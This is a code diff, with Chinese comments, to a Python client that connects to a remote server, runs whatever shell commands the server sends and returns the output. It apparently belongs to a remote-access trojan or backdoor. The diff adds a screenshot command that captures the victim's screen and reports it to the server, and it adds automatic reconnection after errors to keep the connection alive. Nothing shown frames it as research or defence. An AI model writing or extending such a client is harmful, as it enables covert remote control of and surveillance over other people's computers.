@@ -3,6 +3,8 @@ import subprocess
 import threading
 import os
 import time
+import pyautogui
+import tempfile
 
 # 默认保存路径
 default_save_path = os.getcwd()
@@ -43,13 +45,29 @@ def receive_command(sock):
                     print(f"Save path set to: {current_save_path}")
                 else:
                     print("Invalid directory.")
+            elif command.lower() == 'screenshot':
+                # 处理截屏命令
+                screenshot = pyautogui.screenshot()
+                with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp_file:
+                    screenshot.save(tmp_file.name)
+                    file_size = os.path.getsize(tmp_file.name)
+                    sock.send(f"SCREENSHOT {tmp_file.name} {file_size}".encode('utf-8'))
             else:
                 # 执行命令
                 output = subprocess.check_output(command, shell=True)
                 # 发送命令执行结果回服务端
                 sock.send(output)
         except Exception as e:
-            sock.send(str(e).encode('utf-8'))
+            print(f"Error: {e}")
+            # 尝试重新连接
+            time.sleep(1)
+            try:
+                sock.close()
+                sock = connect_to_server()
+                sock.send('ready'.encode('utf-8'))
+            except Exception as e:
+                print(f"Reconnection failed: {e}")
+                time.sleep(1)
     sock.close()
 
 def connect_to_server():
